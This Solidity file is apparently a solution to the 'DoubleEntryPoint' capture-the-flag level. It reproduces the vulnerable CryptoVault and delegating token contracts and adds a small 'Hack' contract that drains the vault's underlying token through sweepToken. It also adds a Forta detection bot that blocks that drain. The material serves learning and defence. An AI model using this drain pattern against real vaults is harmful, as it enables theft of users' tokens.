// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "../node_modules/hardhat-console/contracts/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/access/Ownable.sol";


/**
This level features a CryptoVault with special functionality, the sweepToken function. 
This is a common function to retrieve tokens stuck in a contract. 
The CryptoVault operates with an underlying token that can't be swept, 
being it an important core's logic component of the CryptoVault, 
any other token can be swept.

The underlying token is an instance of the DET token implemented in DoubleEntryPoint contract definition 
and the CryptoVault holds 100 units of it. 
Additionally the CryptoVault also holds 100 of LegacyToken LGT.

In this level you should figure out where the bug is in CryptoVault and protect it from being drained out of tokens.

The contract features a Forta contract where any user can register its own detection bot contract. 
Forta is a decentralized, community-based monitoring network to detect threats and anomalies on DeFi, NFT, governance,
bridges and other Web3 systems as quickly as possible. 

Your job is to implement a detection bot and register it in the Forta contract.
 The bot's implementation will need to raise correct alerts to prevent potential attacks or bug exploits.

Things that might help:

How does a double entry point work for a token contract ?


**/
interface DelegateERC20 {
  function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);
}

interface IDetectionBot {
    function handleTransaction(address user, bytes calldata msgData) external;
}

interface IForta {
    function setDetectionBot(address detectionBotAddress) external;
    function notify(address user, bytes calldata msgData) external;
    function raiseAlert(address user) external;
}

contract Forta is IForta {
  mapping(address => IDetectionBot) public usersDetectionBots;
  mapping(address => uint256) public botRaisedAlerts;

  function setDetectionBot(address detectionBotAddress) external override {
      require(address(usersDetectionBots[msg.sender]) == address(0), "DetectionBot already set");
      usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);
  }

  function notify(address user, bytes calldata msgData) external override {
    if(address(usersDetectionBots[user]) == address(0)) return;
    try usersDetectionBots[user].handleTransaction(user, msgData) {
        return;
    } catch {}
  }

  function raiseAlert(address user) external override {
      if(address(usersDetectionBots[user]) != msg.sender) return;
      botRaisedAlerts[msg.sender] += 1;
  } 
}

contract CryptoVault {
    address public sweptTokensRecipient;
    IERC20 public underlying;

    constructor(address recipient) {
        sweptTokensRecipient = recipient;
    }

    function setUnderlying(address latestToken) public {
        require(address(underlying) == address(0), "Already set");
        underlying = IERC20(latestToken);
    }

    /*
    ...
    */

    function sweepToken(IERC20 token) public {
        require(token != underlying, "Can't transfer underlying token");
        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));
    }
}

contract LegacyToken is ERC20("LegacyToken", "LGT"), Ownable {
    DelegateERC20 public delegate;

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }

    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner {
        delegate = newContract;
    }

    function transfer(address to, uint256 value) public override returns (bool) {
        if (address(delegate) == address(0)) {
            return super.transfer(to, value);
        } else {
            return delegate.delegateTransfer(to, value, msg.sender);
        }
    }
}

contract DoubleEntryPoint is ERC20("DoubleEntryPointToken", "DET"), DelegateERC20, Ownable {
    address public cryptoVault;
    address public player;
    address public delegatedFrom;
    Forta public forta;

    constructor(address legacyToken, address vaultAddress, address fortaAddress) {
        delegatedFrom = legacyToken;
        forta = Forta(fortaAddress);
        player = msg.sender;
        cryptoVault = vaultAddress;
        _mint(cryptoVault, 100 ether);
    }

//0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8,100000000000000000000
// 0xD7ACd2a9FD159E69Bb102A1ca21C9a3e3A5F771B,100000000000000000000
//0xf8e81D47203A594245E36C48e151709F0C19fBe8,0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2,100000000000000000000
    modifier onlyDelegateFrom() {
        require(msg.sender == delegatedFrom, "Not legacy contract");
        _;
    }

    modifier fortaNotify() {
        address detectionBot = address(forta.usersDetectionBots(player));

        // Cache old number of bot alerts
        uint256 previousValue = forta.botRaisedAlerts(detectionBot);

        // Notify Forta
        forta.notify(player, msg.data);

        // Continue execution
        _;

        // Check if alarms have been raised
        if(forta.botRaisedAlerts(detectionBot) > previousValue) revert("Alert has been triggered, reverting");
    }

    function delegateTransfer(
        address to,
        uint256 value,
        address origSender
    ) public override onlyDelegateFrom fortaNotify returns (bool) {
        _transfer(origSender, to, value);
        return true;
    }
}


interface CryptoVaultI {
    function sweepToken(address token) external;
}

interface DetI {
    function balanceOf(address add) external view returns(uint);
}
//0xEf9f1ACE83dfbB8f559Da621f4aEA72C6EB10eBf,0x4a9C121080f6D9250Fc0143f41B595fD172E31bf,0x0498B7c793D7432Cd9dB27fb02fc9cfdBAfA1Fd3
contract Hack {

    CryptoVaultI vault;
    DetI det;
    address legacyToken;

    constructor(address _vault, address _legacyToken, address _det){
        vault = CryptoVaultI(_vault);
        legacyToken = _legacyToken;
        det = DetI(_det);
    }

    function getTokenBalance() public view returns(uint) {
        return det.balanceOf(address(vault));
    }

    function hack() public {
        vault.sweepToken(legacyToken);
    }
}

contract HackPreventBot is IDetectionBot {
  address public cryptoVaultAddress;

  constructor(address _cryptoVaultAddress) {
    cryptoVaultAddress = _cryptoVaultAddress;
  }

  function handleTransaction(address user, bytes calldata  msgData) external override { 
    address origSender;
    assembly {
      origSender := calldataload(0xa8)
    }

    if (origSender == cryptoVaultAddress) {
      Forta(msg.sender).raiseAlert(user);
    }
  }
}